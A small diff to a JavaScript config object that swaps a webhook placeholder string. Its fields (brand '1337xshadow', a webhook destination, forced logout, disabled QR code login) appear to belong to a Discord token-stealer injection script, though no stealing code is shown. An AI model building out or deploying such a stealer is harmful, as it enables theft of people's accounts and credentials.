@@ -11,7 +11,7 @@ const fs = require("fs");
 var config = {
     brand: "1337xshadow",
 
-    webhook: "%WEBHOOK_LINK%",
+    webhook: "webhook_link",
 
     logout: true,
     disable_qr_code: true,
